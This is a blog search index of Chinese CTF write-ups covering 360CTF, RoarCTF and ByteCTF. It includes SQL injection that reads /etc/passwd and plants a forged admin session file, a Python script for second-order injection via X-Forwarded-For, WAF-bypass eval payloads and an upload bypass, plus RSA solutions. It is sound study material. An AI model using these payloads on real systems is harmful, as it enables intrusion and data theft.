<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>360ctfweb-云复现[working]</title>
    <url>/2019/10/23/360ctfweb-cloud-fuxian/</url>
    <content><![CDATA[<p>这次360 ctf没做出题目,赛后看看wp收获良多, 为防止遗忘特此记录.</p>
<h1 id="立誓要成为admin的男人"><a href="#立誓要成为admin的男人" class="headerlink" title="立誓要成为admin的男人"></a>立誓要成为admin的男人</h1><p>开局提示不是admin</p>
<p>盲注</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67405937-fea53080-f5e7-11e9-8d22-aeddaf0e3cec.png" alt="image"></p>
<p>然后使用sqlmap来反弹mysql shell, 命令 <code>mysql -u xxxx -r&quot;xxxxx&quot; -p username --os-shell</code></p>
<p>然后发现了user表格, admin 的md5 爆破不出来. 可以读取/etc/passwd, 命令 <code>select load_file(&#39;/etc/passwd&#39;);</code></p>
<p>再尝试读取/var/www/html/index.php, 失败,向站点写文件失败,访问404, 命令<code>username=1&#39; union select &#39;test&#39; into outfile &#39;/var/www/html/1.php</code>.</p>
<p>扫描网站发现test.php, 访问结果如下, 如果登录过就会打印当前用户名, <code>可以猜测为session</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67407018-72940880-f5e9-11e9-916f-92587e78c5e8.png" alt="image"></p>
<p>向/tmp/sess_xxxxxxxxxxx写入admin的序列化字符串, 并用xxxxxxx作为PHPSESSID访问index.php就可以得到flag.</p>
<p>命令:<code>username=1&#39; union select &#39;username|s:5:&quot;admin&quot;;&#39; into outfile &#39;/tmp/sess_xxxxxxxxxxxxxxxx</code></p>
]]></content>
  </entry>
  <entry>
    <title>RoarCTF复现</title>
    <url>/2019/10/22/RoarCTFwp/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="online-proxy"><a href="#online-proxy" class="headerlink" title="online_proxy"></a>online_proxy</h2><p>特征: 第一次登录后源代码内容有如下:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630479-64810900-f8c3-11e9-8f83-7f39e711f736.png" alt="image"></p>
<p>换一个<strong>X-Forwarded-For</strong> 后会发现currentip是根据xff判别的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630507-c6da0980-f8c3-11e9-8d87-eff135976d57.png" alt="image"></p>
<p>那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = query(<span class="string">"select current_ip, last_ip from ip_log where uuid = '"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span>(count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($ip !== $result[<span class="number">0</span>][<span class="string">'current_ip'</span>]) &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'current_ip'</span>];</span><br><span class="line">        query(<span class="string">"delete from ip_log where uuid='"</span>.addslashes($uuid).<span class="string">"'"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip = $result[<span class="number">0</span>][<span class="string">'last_ip'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">query(<span class="string">"insert into ip_log values ('"</span>.addslashes($uuid).<span class="string">"', '"</span>.addslashes($ip).<span class="string">"', '$last_ip');"</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip "</span>.($last_ip !== <span class="string">""</span> ? <span class="string">"\nLast Ip: "</span>.$last_ip : <span class="string">""</span>).<span class="string">" --&gt;"</span>);</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<p>先用<code>1&#39;|1|&#39;1</code>作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成<strong>二次注入</strong>, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630576-d443c380-f8c4-11e9-859d-b807ff467d3c.png" alt="image"></p>
<p>成功执行了.</p>
<p>搬运赵师傅的脚本学习学习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://localhost:8302/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]请求语句："</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]长度："</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]位置 "</span> + str(i) + <span class="string">" 请求五位成功:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure>

<p>5555555</p>
<p>在addslashes后插入数据在数据库中是这样的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67630753-8bd9d500-f8c7-11e9-9e14-731b86ed3e4c.png" alt="image"></p>
<p>第二行是提取出来不经过addslashes重新插入的结果</p>
<h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号</span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;));</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>

<p>源码是这么执行语句的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">       $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">       <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">               <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Simple-UPload"><a href="#Simple-UPload" class="headerlink" title="Simple UPload"></a>Simple UPload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路: 由于只对’file’文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>题目给出了条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span><br><span class="line"></span><br><span class="line">e=0x10001</span><br><span class="line"></span><br><span class="line">(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L</span><br><span class="line"></span><br><span class="line">p=gmpy2.next_prime(x*y*z)</span><br><span class="line"></span><br><span class="line">q=gmpy2.next_prime(z)</span><br><span class="line"></span><br><span class="line">c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span><br></pre></td></tr></table></figure>

<p>因为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2**(2019) &gt; 26833491826787145242474...1422L</span><br></pre></td></tr></table></figure>

<p>所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((y%x)**5)%(x%y) = 1 或者 0</span><br></pre></td></tr></table></figure>

<p>所以将这项忽略,再将(y+1)/x忽略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y 约等于26833491826787145242474...1422L的316次方</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y 约等于83</span><br></pre></td></tr></table></figure>

<p>然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83</p>
<p>接下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p = xyz + a</span><br><span class="line">q = z + b</span><br><span class="line">xyzz + xyzb + az + ab = n</span><br></pre></td></tr></table></figure>

<p>忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  x=2</span></span><br><span class="line"><span class="comment">#  y = 83</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  z_close = gmpy2.iroot(n//166, 2)</span></span><br><span class="line">z_close = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p_close = gmpy2.next_prime(<span class="number">166</span>*z_close)</span><br><span class="line">    <span class="keyword">if</span> n % p_close == <span class="number">0</span>:</span><br><span class="line">        p = p_close</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    z_close -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 </span></span><br><span class="line"><span class="comment">#  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure>



<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myGetPrime</span><span class="params">()</span>:</span></span><br><span class="line">    A= getPrime(<span class="number">513</span>)</span><br><span class="line">    print(A)</span><br><span class="line">    B=A-random.randint(<span class="number">1e3</span>,<span class="number">1e5</span>)</span><br><span class="line">    print(B)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextPrime((B!)%A)</span><br><span class="line"></span><br><span class="line">p=myGetPrime()</span><br><span class="line"><span class="comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line"><span class="comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line"><span class="comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line"><span class="comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line"><span class="comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=pow(flag,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure>

<p>直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.</p>
<p>这里要用到威尔逊定理</p>
<blockquote>
<p>判定一个数字是素数的充分必要条件:</p>
<p>(p-1)! = -1 (mod p)</p>
</blockquote>
<p>在这套题中可以发现<code>(-1)(A-1)(A-2)...(B+2)(B+1)</code>是<code>B!</code> 关于A的逆元,然后就好求了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprime</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b+<span class="number">1</span>, a):</span><br><span class="line">        ans = (ans *i) % a</span><br><span class="line">    ans = <span class="number">-1</span> * ans</span><br><span class="line">    num = gmpy2.invert(ans ,a)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">p = myprime(A1, B1)</span><br><span class="line"></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">q = myprime(A2, B2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line">r = n /(p*q)</span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(r<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(enc, d, n)</span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(m)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>bytectf2019</title>
    <url>/2019/09/09/bytectf2019-working/</url>
    <content><![CDATA[<h2 id="boring-code"><a href="#boring-code" class="headerlink" title="boring code"></a>boring code</h2><p>source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<p>这两个payload都很精彩, 涉及的知识点如下:</p>
<ul>
<li><p>crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.</p>
</li>
<li><p>ord函数传入字符串的时候, 只返回第一个字符的ascii码</p>
</li>
<li><p>localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是”小数点字符”,  也就是点号</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(localeconv());</span><br><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  